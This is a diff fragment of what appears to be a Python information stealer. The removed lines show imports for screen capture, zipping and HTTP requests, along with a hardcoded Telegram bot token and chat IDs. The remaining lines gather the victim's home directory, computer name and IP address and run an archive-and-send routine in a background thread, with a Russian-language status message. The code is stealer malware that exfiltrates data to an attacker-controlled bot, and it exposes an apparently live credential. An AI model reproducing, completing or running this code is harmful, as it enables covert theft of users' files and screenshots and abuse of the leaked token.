@@ -1,15 +1,3 @@
-import socket
-from PIL import ImageGrab
-from io import BytesIO
-import os
-import zipfile
-import requests
-import threading
-import time
-
-telegram_bot_token = "7178222884:AAFr5QLUb_g6LKHzEgVG7mGlLLuBVSi3TjQ"
-chat_ids = ('1882056354', '1882056354')
-
 user = os.path.expanduser("~")
 system_name = os.getenv('COMPUTERNAME')
 ip = socket.gethostbyname(socket.gethostname())
@@ -80,17 +68,16 @@ def archive_and_send():
             else:
                 print("Failed to create or send zip file.")
         except Exception as e:
-            archive_and_send()
             print(f"Error creating or sending zip file: {str(e)}")
 
 
 thread = threading.Thread(target=archive_and_send)
 thread.start()
-time.sleep(13)
+time.sleep(20)
 if thread.is_alive():
     print("Архивирование и отправка занимают больше времени. Принудительно завершаем.")
     thread.join()
-    
+
 def mains():
     main()
 if __name__ == "__main__":
